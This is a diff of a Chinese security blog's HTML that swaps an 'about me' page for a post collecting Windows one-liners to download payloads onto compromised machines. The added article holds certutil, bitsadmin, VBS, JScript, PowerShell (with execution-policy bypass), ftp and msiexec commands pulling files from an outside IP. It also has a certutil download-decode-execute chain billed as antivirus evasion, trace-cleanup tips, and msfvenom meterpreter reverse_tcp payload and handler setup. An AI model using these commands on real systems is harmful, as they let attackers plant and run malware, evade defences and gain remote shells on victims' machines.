@@ -5,10 +5,12 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="关于我, W4nde3&#39;s Secret">
+    <meta name="keywords" content="一句话下载, W4nde3&#39;s Secret">
     <meta name="baidu-site-verification" content="fmlEuI34ir">
     <meta name="google-site-verification" content="KeoTn_OFy4ndJwXNmm2gMeQfPhd7alqE9vQDwI32KCY">
-    <meta name="description" content="关于我 | W4nde3&#39;s Secret">
+    <meta name="description" content="前言本篇博客整理了多种一句话下载文件的脚本，用于payload迁移
+vbs# 执行：cscript download.vbs http://39.105.228.43/index.html index.html
+echo set a=cre">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -16,7 +18,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>关于我 | W4nde3&#39;s Secret</title>
+    <title>一句话下载 | W4nde3&#39;s Secret</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -465,432 +467,289 @@
 
 </header>
 
-        <style type="text/css">
-    /* don't remove. */
-    .about-cover {
-        height: 75vh;
-    }
-</style>
+        
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
 
-<div class="bg-cover pd-header about-cover">
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
     <div class="container">
-    <div class="row">
-    <div class="col s10 offset-s1 m8 offset-m2 l8 offset-l2">
-        <div class="brand">
-            <div class="title center-align">
-                <!-- 
-                    blog
-                 -->
-                
-                    关于我
-                
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <div class="description center-align post-title">
+                        一句话下载
+                    </div>
+                </div>
             </div>
-
-            <div class="description center-align">
-                
-                    <!-- 东北大学 | 信息安全 | 滑水CTF选手 | 渗透入门 | 安全工具开发 -->
-                    <span id="jinrishici-sentence">正在加载今日诗词...</span>
-                
-            </div>
-            
-            
         </div>
     </div>
 </div>
-<script>
-// 每天切换 banner 图.  Switch banner image every day.
-$('.bg-cover').css('background-image', 'url(/medias/banner/' + new Date().getDay() + '.jpg)');
-</script>
-
-
-    </div>
-</div>
-
-<main class="content">
-
-    <div id="aboutme" class="container about-container">
-        <div class="card">
-            <div class="card-content">
-                <div class="row">
-                    <div class="post-statis col l4 hide-on-med-and-down" data-aos="zoom-in-right">
-                        
-<div class="statis">
-    <span class="count"><a href="/" target="_blank">9</a></span>
-    <span class="name">文章</span>
-</div>
 
 
 
+<main class="post-container content">
 
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
 
-                    </div>
-                    <div class="col s12 m12 l4">
-                        <div class="profile center-align">
-                            <div class="avatar">
-                                <img src="/medias/avatars/hwsun.jpg" alt="W4nde3"
-                                    class="circle responsive-img avatar-img">
-                            </div>
-                            <div class="author">
-                                <div class="post-statis hide-on-large-only" data-aos="zoom-in-right">
-                                    
-<div class="statis">
-    <span class="count"><a href="/" target="_blank">9</a></span>
-    <span class="name">文章</span>
-</div>
+    #articleContent :focus {
+        outline: none;
+    }
 
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
 
+    .toc-widget {
+        padding-left: 20px;
+    }
 
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
 
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
 
-                                </div>
-                                <div class="title">W4nde3</div>
-                                <div class="career">东北大学 | 信息安全 | 渗透入门 | 安全工具开发</div>
-                                <div class="social-link hide-on-large-only" data-aos="zoom-in-left">
-                                    
-    <a href="https://github.com/w4nde3" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
-        <i class="fa fa-github"></i>
-    </a>
+    #toc-content ol {
+        padding-left: 10px;
+    }
 
+    #toc-content ol li {
+        padding-left: 10px;
+    }
 
- 
-    <a href="https://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=1938585006@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
-        <i class="fa fa-envelope-open"></i>
-    </a>
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
 
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
 
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
 
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
 
+    #floating-toc-btn {
+        position: fixed;
+        right: 20px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
 
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
 
-    <a href="http://wpa.qq.com/msgrd?v=3&uin=1938585006&site=qq&menu=yes" class="tooltipped" target="_blank" data-tooltip="访问我的QQ空间" data-position="top" data-delay="50">
-        <i class="fa fa-qq"></i>
-    </a>
-
-
-
-
-
-    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
-        <i class="fa fa-rss"></i>
-    </a>
-
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                    <div class="col l4 hide-on-med-and-down" data-aos="zoom-in-left">
-                        <div class="social-link">
-                            
-    <a href="https://github.com/w4nde3" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
-        <i class="fa fa-github"></i>
-    </a>
-
-
- 
-    <a href="https://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=1938585006@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
-        <i class="fa fa-envelope-open"></i>
-    </a>
-
-
-
-
-
-
-    <a href="http://wpa.qq.com/msgrd?v=3&uin=1938585006&site=qq&menu=yes" class="tooltipped" target="_blank" data-tooltip="访问我的QQ空间" data-position="top" data-delay="50">
-        <i class="fa fa-qq"></i>
-    </a>
-
-
-
-
-
-    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
-        <i class="fa fa-rss"></i>
-    </a>
-
-                        </div>
-                    </div>
-                </div>
-
-                <div class="introduction center-align" data-aos="fade-up">
-                    滑水CTF选手
-                </div>
-
-                <style type="text/css">
-    #posts-chart,
-    #categories-chart,
-    #tags-chart {
-        width: 100%;
-        height: 300px;
-        margin: 0.5rem auto;
-        padding: 0.5rem;
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
     }
 </style>
-
-<div id="postCharts" class="post-charts">
-    <div class="title center-align" data-aos="zoom-in-up">
-        <i class="fa fa-bar-chart"></i>&nbsp;&nbsp;文章统计图
-    </div>
-    <div class="row">
-        <div class="chart col s12 m6 l4" data-aos="zoom-in-up">
-            <div id="posts-chart"></div>
-        </div>
-
-        <div class="chart col s12 m6 l4" data-aos="zoom-in-up">
-            <div id="categories-chart"></div>
-        </div>
-
-        <div class="chart col s12 m6 l4" data-aos="zoom-in-up">
-            <div id="tags-chart"></div>
-        </div>
-    </div>
-</div>
-
-<script type="text/javascript" src="https://cdn.bootcss.com/echarts/4.7.0/echarts.min.js"></script>
-<script>
-    let postsChart = echarts.init(document.getElementById('posts-chart'));
-    let categoriesChart = echarts.init(document.getElementById('categories-chart'));
-    let tagsChart = echarts.init(document.getElementById('tags-chart'));
-
-    
-
-    let postsOption = {
-        title: {
-            text: '文章发布统计图',
-            top: -5,
-            x: 'center'
-        },
-        tooltip: {
-            trigger: 'axis'
-        },
-        xAxis: {
-            type: 'category',
-            data: ["2019-12","2020-01","2020-02","2020-03","2020-04","2020-05","2020-06","2020-07","2020-08","2020-09","2020-10","2020-11","2020-12"]
-        },
-        yAxis: {
-            type: 'value',
-        },
-        series: [
-            {
-                name: '文章篇数',
-                type: 'line',
-                color: ['#6772e5'],
-                data: [0,0,0,0,0,0,0,0,0,0,0,3,6],
-                markPoint: {
-                    symbolSize: 45,
-                    color: ['#fa755a','#3ecf8e','#82d3f4'],
-                    data: [{
-                        type: 'max',
-                        itemStyle: {color: ['#3ecf8e']},
-                        name: '最大值'
-                    }, {
-                        type: 'min',
-                        itemStyle: {color: ['#fa755a']},
-                        name: '最小值'
-                    }]
-                },
-                markLine: {
-                    itemStyle: {color: ['#ab47bc']},
-                    data: [
-                        {type: 'average', name: '平均值'}
-                    ]
-                }
-            }
-        ]
-    };
-
-    
-
-    let categoriesOption = {
-        title: {
-            text: '文章分类统计图',
-            top: -4,
-            x: 'center'
-        },
-        tooltip: {
-            trigger: 'item',
-            formatter: "{a} <br/>{b} : {c} ({d}%)"
-        },
-        series: [
-            {
-                name: '分类',
-                type: 'pie',
-                radius: '50%',
-                color: ['#6772e5', '#ff9e0f', '#fa755a', '#3ecf8e', '#82d3f4', '#ab47bc', '#525f7f', '#f51c47', '#26A69A'],
-                data: [],
-                itemStyle: {
-                    emphasis: {
-                        shadowBlur: 10,
-                        shadowOffsetX: 0,
-                        shadowColor: 'rgba(0, 0, 0, 0.5)'
-                    }
-                }
-            }
-        ]
-    };
-
-    
-
-    let tagsOption = {
-        title: {
-            text: 'TOP10 标签统计图',
-            top: -5,
-            x: 'center'
-        },
-        tooltip: {},
-        xAxis: [
-            {
-                type: 'category',
-                data: []
-            }
-        ],
-        yAxis: [
-            {
-                type: 'value'
-            }
-        ],
-        series: [
-            {
-                type: 'bar',
-                color: ['#82d3f4'],
-                barWidth : 18,
-                data: [],
-                markPoint: {
-                    symbolSize: 45,
-                    data: [{
-                        type: 'max',
-                        itemStyle: {color: ['#3ecf8e']},
-                        name: '最大值'
-                    }, {
-                        type: 'min',
-                        itemStyle: {color: ['#fa755a']},
-                        name: '最小值'
-                    }],
-                },
-                markLine: {
-                    itemStyle: {color: ['#ab47bc']},
-                    data: [
-                        {type: 'average', name: '平均值'}
-                    ]
-                }
-            }
-        ]
-    };
-
-    // render the charts
-    postsChart.setOption(postsOption);
-    categoriesChart.setOption(categoriesOption);
-    tagsChart.setOption(tagsOption);
-</script>
-
-                
-
-                
-                
-<div class="my-skills">
-    <div class="title center-align" data-aos="zoom-in-up">
-        <i class="fa fa-wrench"></i>&nbsp;&nbsp;我的技能
-    </div>
-    <div class="row">
-        
-        
-        
-        <div class="col s12 m6 l6" data-aos="fade-up">
-            <div class="skillbar">
-                <div class="skillbar-title"
-                     style="background: linear-gradient(to right, #FF0066 0%, #FF00CC 100%); width: 80%">
-                    <span>CTF</span>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
+                    
                 </div>
-                <div class="skill-bar-percent">80%</div>
-            </div>
-        </div>
-        
-        
-        <div class="col s12 m6 l6" data-aos="fade-up">
-            <div class="skillbar">
-                <div class="skillbar-title"
-                     style="background: linear-gradient(to right, #9900FF 0%, #CC66FF 100%); width: 70%">
-                    <span>Go</span>
+                <div class="col s5 right-align">
+                    
                 </div>
-                <div class="skill-bar-percent">70%</div>
             </div>
-        </div>
-        
-        
-        <div class="col s12 m6 l6" data-aos="fade-up">
-            <div class="skillbar">
-                <div class="skillbar-title"
-                     style="background: linear-gradient(to right, #2196F3 0%, #42A5F5 100%); width: 90%">
-                    <span>Python</span>
-                </div>
-                <div class="skill-bar-percent">90%</div>
-            </div>
-        </div>
-        
-        
-        <div class="col s12 m6 l6" data-aos="fade-up">
-            <div class="skillbar">
-                <div class="skillbar-title"
-                     style="background: linear-gradient(to right, #00BCD4 0%, #80DEEA 100%); width: 70%">
-                    <span>Java</span>
-                </div>
-                <div class="skill-bar-percent">70%</div>
-            </div>
-        </div>
-        
-        
-        <div class="col s12 m6 l6" data-aos="fade-up">
-            <div class="skillbar">
-                <div class="skillbar-title"
-                     style="background: linear-gradient(to right, #4CAF50 0%, #81C784 100%); width: 50%">
-                    <span>Mysql</span>
-                </div>
-                <div class="skill-bar-percent">50%</div>
-            </div>
-        </div>
-        
-        
-        <div class="col s12 m6 l6" data-aos="fade-up">
-            <div class="skillbar">
-                <div class="skillbar-title"
-                     style="background: linear-gradient(to right, #FFEB3B 0%, #FFF176 100%); width: 70%">
-                    <span>DevOps</span>
-                </div>
-                <div class="skill-bar-percent">70%</div>
-            </div>
-        </div>
-        
-        
-    </div>
-
-    
-
-  
-    <div class="other-skills chip-container" data-aos="zoom-in-up">
-        <div class="sub-title center-align"><i class="fa fa-book"></i>&nbsp;&nbsp;其他技能</div>
-        <div class="tag-chips center-align">
             
-        </div>
-    </div>
-     
+            <div class="post-info">
+                <div class="post-date info-break-policy">
+                    <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2020-12-09
+                </div>
 
-</div>
+                <div class="post-author info-break-policy">
+                    <i class="fa fa-user-o fa-fw"></i>作者:&nbsp;&nbsp;
+                    
+                        W4nde3
+                    
+                </div>
+
+                
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
+                        900
+                    </div>
+                    
+
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                        4 分
+                    </div>
+                    
                 
                 
+                
+                        <span id="busuanzi_container_site_pv" style='display:none'></span>
+                        <i class="fa fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv" ></span>
+    
+                
+
             </div>
         </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本篇博客整理了多种一句话下载文件的脚本，用于payload迁移</p>
+<h3 id="vbs"><a href="#vbs" class="headerlink" title="vbs"></a>vbs</h3><pre><code># 执行：cscript download.vbs http://39.105.228.43/index.html index.html
+echo set a=createobject(^"adod^"+^"b.stream^"):set w=createobject(^"micro^"+^"soft.xmlhttp^"):w.open^"get^",wsh.arguments(0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2 &gt;&gt;downfile.vbs
 
-        <div class="card">
-            <div class="card-content">
-                <div class="card-content article-card-content">
-                        <div class="title center-align" data-aos="zoom-in-up">
-                            <i class="fa fa-address-book"></i>&nbsp;&nbsp;我的简历
-                        </div>
-                        <div id="articleContent" data-aos="fade-up">
-                            <h2 id="教育经历"><a href="#教育经历" class="headerlink" title="教育经历"></a>教育经历</h2><p><b>东北大学 软件学院 信息安全专业</b></p>
-<h2 id="爱好"><a href="#爱好" class="headerlink" title="爱好"></a>爱好</h2><p>健身、音乐、CTF、渗透</p>
-<h2 id="❤️"><a href="#❤️" class="headerlink" title="❤️"></a>❤️</h2><p>小于力</p>
-<script>
+
+# 等价的脚本
+strFileURL = "http://39.105.228.43/index.html" 
+strHDLocation = "c:\\test\\index.txt" 
+Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP") 
+    objXMLHTTP.open "GET", strFileURL, false 
+    objXMLHTTP.send() 
+If objXMLHTTP.Status = 200 Then 
+Set objADOStream = CreateObject("ADODB.Stream") 
+objADOStream.Open 
+objADOStream.Type = 1 
+objADOStream.Write objXMLHTTP.ResponseBody 
+objADOStream.Position = 0 
+Set objFSO = CreateObject("Scripting.FileSystemObject") 
+If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation 
+Set objFSO = Nothing 
+objADOStream.SaveToFile strHDLocation 
+objADOStream.Close 
+Set objADOStream = Nothing 
+End if 
+Set objXMLHTTP = Nothing</code></pre><h3 id="certutil"><a href="#certutil" class="headerlink" title="certutil"></a>certutil</h3><pre><code>certutil.exe -urlcache -split -f http://39.105.228.43/index.html
+# certutil下载文件会有缓存留下痕迹，应及时删除缓存
+certutil.exe -urlcache -split -f http://39.105.228.43/index.html delete
+
+# 结合certutil的其他用法可以进行简单免杀
+certutil -urlcache -split -f http://39.105.228.43/payload.b64 payload.b64 &amp; certutil -decode payload.b64 payload.exe &amp; payload.exe</code></pre><h3 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h3><pre><code># 需要假设ftp服务器，使用binary模式传输二进制文件否则会损坏
+echo open 39.105.228.43 21&gt; ftp.txt
+echo 123&gt;&gt; ftp.txt //user
+echo 123&gt;&gt; ftp.txt //password
+echo binary &gt;&gt; ftp.txt //bin模式
+echo get robots.txt &gt;&gt; ftp.txt
+echo bye &gt;&gt; ftp.txt
+
+# 缩短成一句话，需要用户名密码的情形
+echo open [ftp_server_ip] &gt; o&amp;echo user [username] [passwd] &gt;&gt; o &amp;echo get [filename] &gt;&gt; o &amp;echo quit &gt;&gt; o &amp;ftp ‐n ‐s:o &amp;del /F /Q o
+
+# 缩短成一句话，匿名用户
+echo open [ftp_server_ip] &gt; o&amp;echo get [filename] &gt;&gt; o &amp;echo quit &gt;&gt; o &amp;ftp ‐A ‐n ‐s:o &amp;del /F /Q o</code></pre><h3 id="bitsadmin"><a href="#bitsadmin" class="headerlink" title="bitsadmin"></a>bitsadmin</h3><pre><code># 最后一个参数需要为绝对路径
+bitsadmin /rawreturn /transfer down "http://39.105.228.43/index.html" C:\\Users\\wander\\index.html
+
+# 可以使用进度条和调整优先级
+bitsadmin /rawreturn /transfer down /download /priority normal "http://39.105.228.43/index.html" C:\\Users\\wander\\index.html
+
+# 第三种方法
+bitsadmin /rawreturn /transfer getfile "http://39.105.228.43/index.html" C:\\Users\\wander\\index.html
+
+# 第四种方法
+bitsadmin /rawreturn /transfer getpayload "http://39.105.228.43/index.html" C:\\Users\\wander\\index.html
+
+# 第五种方法
+bitsadmin /transfer myDownLoadJob /download /priority normal "http://39.105.228.43/index.html" "C:\\Users\\wander\\index.html"</code></pre><h3 id="Js"><a href="#Js" class="headerlink" title="Js"></a>Js</h3><pre><code># 下载文件并直接打印
+LANGUAGE="javascript";
+var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
+WinHttpReq.Send();
+WScript.Echo(WinHttpReq.ResponseText);
+
+# 下载文件并保存
+LANGUAGE="javascript";
+var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
+WinHttpReq.Send();
+
+BinStream = new ActiveXObject("ADODB.Stream"); BinStream.Type = 1;
+BinStream.Open(); BinStream.Write(WinHttpReq.ResponseBody);
+BinStream.SaveToFile("404.html");</code></pre><h3 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h3><p>powershell执行get-executionpolicy，若为Restricted则禁止直行脚本，需要管理员权限的powershell设置<code>set-executionpolicy -executionpolicy unrestricted</code></p>
+<pre><code># 低版本powershell基于System.Net.WebClient下载文件
+$Urls = @()
+$Urls += "http://39.105.228.43/index.html"
+$OutPath = "C:\\Users\\wander\\Desktop\\" 
+ForEach ( $item in $Urls) {
+$file = $OutPath + ($item).split('/')[-1]
+(New-Object System.Net.WebClient).DownloadFile($item, $file) 
+}
+
+
+# powershell 3.0之后可使用Invoke-WebRequest
+$url = "http://39.105.228.43/index.html"
+$output = "C:\\Users\\wander\\Desktop\\"
+$start_time = Get-Date
+Invoke-WebRequest -Uri $url -OutFile $output
+Write-Output "Time : $((Get-Date).Subtract($start_time).Seconds) second(s)"
+
+# 缩短成一句话
+powershell -exec bypass -c (new-object System.Net.WebClient).DownloadFile('http://39.105.228.43/index.html','C:\\Users\\wander\\Desktop\\')</code></pre><h3 id="msiexec-exe"><a href="#msiexec-exe" class="headerlink" title="msiexec.exe"></a>msiexec.exe</h3><p>msiexec.exe是系统进程，用于安装msi程序，支持远程下载<br>可以先用metasploit生成msi payload，然后在目标机下载执行得到meterpreter</p>
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=172.22.115.182 lport=8888 -f msi &gt; hack.msi
+
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 172.22.115.182
+set lport 8888
+run
+
+
+# 使用msiexec.exe下载
+msiexec.exe /q /i http://172.22.115.182/hack.msi</code></pre><script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
             if (!el.dataset.src) { return; }
@@ -909,13 +768,264 @@ $('.bg-cover').css('background-image', 'url(/medias/banner/' + new Date().getDay
             document.body.appendChild(img);
           });
       </script>
-                        </div>
+            </div>
+            <hr/>
+
+            
+
+            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    <div class="social-share" data-disabled="qzone" data-wechat-qrcode-helper="<p>微信里点“发现”->“扫一扫”二维码便可查看分享。</p>"></div>
+    
+</div>
+
+<script src="/libs/share/js/social-share.min.js"></script>
+
+            
+            
+            
+            <div class="reprint1">
+                <p>
+                    <span class="reprint1-tip">
+                        <i class="fa fa-exclamation-circle"></i>&nbsp;&nbsp;转载请注明:
+                    </span>
+                    <a href="https://blog.iwonder.run" class="b-link-green">W4nde3's Secret</a>
+                    <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
+                    <a href="/2020/12/09/payload-xia-zai-ji-qiao/" class="b-link-green">一句话下载</a>
+                </p>
+            </div>
+
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2020/12/09/payload-xia-zai-ji-qiao/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="一句话下载">
+                        
+                        <span class="card-title">一句话下载</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            前言本篇博客整理了多种一句话下载文件的脚本，用于payload迁移
+vbs# 执行：cscript download.vbs http://39.105.228.43/index.html index.html
+echo set a=cre
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-12-09
+                            </span>
+                        <span class="publish-author">
+                            
+                        </span>
+                    </div>
                 </div>
+
+                
             </div>
         </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/12/08/git-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2018-11235/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="Git远程代码执行漏洞(CVE-2018-11235)">
+                        
+                        <span class="card-title">Git远程代码执行漏洞(CVE-2018-11235)</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            影响范围Git version &lt; 2.13.7Git version 2.14.x &lt; 2.14.4Git version 2.15.x &lt; 2.15.2Git version 2.16.x &lt; 2.16.4Git
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-12-08
+                            </span>
+                        <span class="publish-author">
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('50')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: W4nde3's Secret<br />'
+            + '作者: W4nde3<br />'
+            + '链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
 
     </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="fa fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fa fa-list"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            // headingsOffset: -205,
+            headingSelector: 'h1, h2, h3, h4, h5'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h1, h2, h3, h4, h5').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).slideUp(500);
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).slideDown(500);
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+    
+
 </main>
+
+
         <footer class="page-footer bg-color">
     <div class="container row center-align">
         <div class="col s12 m8 l8 copy-right">
